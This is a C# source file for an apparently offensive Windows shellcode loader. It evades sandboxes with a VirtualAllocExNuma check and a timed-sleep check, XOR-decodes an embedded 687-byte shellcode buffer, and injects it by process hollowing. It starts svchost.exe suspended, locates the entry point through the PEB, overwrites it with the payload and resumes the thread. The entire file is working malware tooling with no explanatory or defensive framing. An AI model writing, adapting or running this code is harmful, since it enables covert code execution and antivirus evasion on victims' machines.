using System;
using System.Runtime.InteropServices;
namespace holcrimson
{
    public class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;
        public const int ProcessBasicInformation = 0;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();
        public static void Run()
        {
            if (VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
            {
                return;
            }
            var rand = new Random();
            uint dream = (uint)rand.Next(10000, 20000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                return;
            }

            byte[] buf = new byte[687] {
0x8b,0x3f,0xf4,0x93,0x87,0x9f,0xbb,0x77,0x77,0x77,0x36,0x26,0x36,0x27,0x25,
0x26,0x21,0x3f,0x46,0xa5,0x12,0x3f,0xfc,0x25,0x17,0x3f,0xfc,0x25,0x6f,0x3f,
0xfc,0x25,0x57,0x3f,0xfc,0x05,0x27,0x3f,0x78,0xc0,0x3d,0x3d,0x3a,0x46,0xbe,
0x3f,0x46,0xb7,0xdb,0x4b,0x16,0x0b,0x75,0x5b,0x57,0x36,0xb6,0xbe,0x7a,0x36,
0x76,0xb6,0x95,0x9a,0x25,0x3f,0xfc,0x25,0x57,0x36,0x26,0xfc,0x35,0x4b,0x3f,
0x76,0xa7,0x11,0xf6,0x0f,0x6f,0x7c,0x75,0x78,0xf2,0x05,0x77,0x77,0x77,0xfc,
0xf7,0xff,0x77,0x77,0x77,0x3f,0xf2,0xb7,0x03,0x10,0x3f,0x76,0xa7,0x27,0xfc,
0x3f,0x6f,0x33,0xfc,0x37,0x57,0x3e,0x76,0xa7,0x94,0x21,0x3a,0x46,0xbe,0x3f,
0x88,0xbe,0x36,0xfc,0x43,0xff,0x3f,0x76,0xa1,0x3f,0x46,0xb7,0x36,0xb6,0xbe,
0x7a,0xdb,0x36,0x76,0xb6,0x4f,0x97,0x02,0x86,0x3b,0x74,0x3b,0x53,0x7f,0x32,
0x4e,0xa6,0x02,0xaf,0x2f,0x33,0xfc,0x37,0x53,0x3e,0x76,0xa7,0x11,0x36,0xfc,
0x7b,0x3f,0x33,0xfc,0x37,0x6b,0x3e,0x76,0xa7,0x36,0xfc,0x73,0xff,0x36,0x2f,
0x3f,0x76,0xa7,0x36,0x2f,0x29,0x2e,0x2d,0x36,0x2f,0x36,0x2e,0x36,0x2d,0x3f,
0xf4,0x9b,0x57,0x36,0x25,0x88,0x97,0x2f,0x36,0x2e,0x2d,0x3f,0xfc,0x65,0x9e,
0x3c,0x88,0x88,0x88,0x2a,0x3f,0x46,0xac,0x24,0x3e,0xc9,0x00,0x1e,0x19,0x1e,
0x19,0x12,0x03,0x77,0x36,0x21,0x3f,0xfe,0x96,0x3e,0xb0,0xb5,0x3b,0x00,0x51,
0x70,0x88,0xa2,0x24,0x24,0x3f,0xfe,0x96,0x24,0x2d,0x3a,0x46,0xb7,0x3a,0x46,
0xbe,0x24,0x24,0x3e,0xcd,0x4d,0x21,0x0e,0xd0,0x77,0x77,0x77,0x77,0x88,0xa2,
0x9f,0x78,0x77,0x77,0x77,0x46,0x4e,0x45,0x59,0x46,0x41,0x4f,0x59,0x43,0x4e,
0x59,0x45,0x45,0x41,0x77,0x2d,0x3f,0xfe,0xb6,0x3e,0xb0,0xb7,0xcc,0x76,0x77,
0x77,0x3a,0x46,0xbe,0x24,0x24,0x1d,0x74,0x24,0x3e,0xcd,0x20,0xfe,0xe8,0xb1,
0x77,0x77,0x77,0x77,0x88,0xa2,0x9f,0xf3,0x77,0x77,0x77,0x58,0x22,0x38,0x41,
0x30,0x46,0x36,0x23,0x3d,0x0e,0x11,0x13,0x01,0x38,0x1a,0x43,0x43,0x33,0x15,
0x19,0x1a,0x3d,0x10,0x3d,0x13,0x05,0x0f,0x23,0x13,0x2d,0x1e,0x39,0x13,0x11,
0x1b,0x1b,0x02,0x4f,0x04,0x22,0x38,0x3a,0x1f,0x02,0x1c,0x18,0x28,0x41,0x1e,
0x43,0x02,0x13,0x3c,0x13,0x45,0x10,0x1a,0x1a,0x40,0x01,0x42,0x1a,0x2f,0x3f,
0x5a,0x2d,0x47,0x04,0x0f,0x14,0x32,0x38,0x14,0x27,0x30,0x3f,0x30,0x11,0x01,
0x34,0x12,0x10,0x12,0x14,0x4f,0x0f,0x20,0x03,0x3d,0x26,0x31,0x14,0x42,0x1f,
0x1a,0x4e,0x38,0x11,0x3d,0x18,0x01,0x26,0x3b,0x45,0x2f,0x02,0x46,0x27,0x39,
0x02,0x40,0x36,0x0f,0x3c,0x41,0x5a,0x32,0x13,0x0d,0x3a,0x36,0x4e,0x19,0x22,
0x23,0x04,0x34,0x2e,0x34,0x33,0x12,0x77,0x3f,0xfe,0xb6,0x24,0x2d,0x36,0x2f,
0x3a,0x46,0xbe,0x24,0x3f,0xcf,0x77,0x45,0xdf,0xf3,0x77,0x77,0x77,0x77,0x27,
0x24,0x24,0x3e,0xb0,0xb5,0x9c,0x22,0x59,0x4c,0x88,0xa2,0x3f,0xfe,0xb1,0x1d,
0x7d,0x28,0x3f,0xfe,0x86,0x1d,0x68,0x2d,0x25,0x1f,0xf7,0x44,0x77,0x77,0x3e,
0xfe,0x97,0x1d,0x73,0x36,0x2e,0x3e,0xcd,0x02,0x31,0xe9,0xf1,0x77,0x77,0x77,
0x77,0x88,0xa2,0x3a,0x46,0xb7,0x24,0x2d,0x3f,0xfe,0x86,0x3a,0x46,0xbe,0x3a,
0x46,0xbe,0x24,0x24,0x3e,0xb0,0xb5,0x5a,0x71,0x6f,0x0c,0x88,0xa2,0xf2,0xb7,
0x02,0x68,0x3f,0xb0,0xb6,0xff,0x64,0x77,0x77,0x3e,0xcd,0x33,0x87,0x42,0x97,
0x77,0x77,0x77,0x77,0x88,0xa2,0x3f,0x88,0xb8,0x03,0x75,0x9c,0xdd,0x9f,0x22,
0x77,0x77,0x77,0x24,0x2e,0x1d,0x37,0x2d,0x3e,0xfe,0xa6,0xb6,0x95,0x67,0x3e,
0xb0,0xb7,0x77,0x67,0x77,0x77,0x3e,0xcd,0x2f,0xd3,0x24,0x92,0x77,0x77,0x77,
0x77,0x88,0xa2,0x3f,0xe4,0x24,0x24,0x3f,0xfe,0x90,0x3f,0xfe,0x86,0x3f,0xfe,
0xad,0x3e,0xb0,0xb7,0x77,0x57,0x77,0x77,0x3e,0xfe,0x8e,0x3e,0xcd,0x65,0xe1,
0xfe,0x95,0x77,0x77,0x77,0x77,0x88,0xa2,0x3f,0xf4,0xb3,0x57,0xf2,0xb7,0x03,
0xc5,0x11,0xfc,0x70,0x3f,0x76,0xb4,0xf2,0xb7,0x02,0xa5,0x2f,0xb4,0x2f,0x1d,
0x77,0x2e,0xcc,0x97,0x6a,0x5d,0x7d,0x36,0xfe,0xad,0x88,0xa2 };



            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(buf[i] ^ (byte)'w');
            }

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] baseAddressBytes = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
            IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);
            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            uint entrypointRvaOffset = e_lfanew + 0x28;
            uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);
            IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

            WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);
            ResumeThread(pi.hThread);
        }
    }
}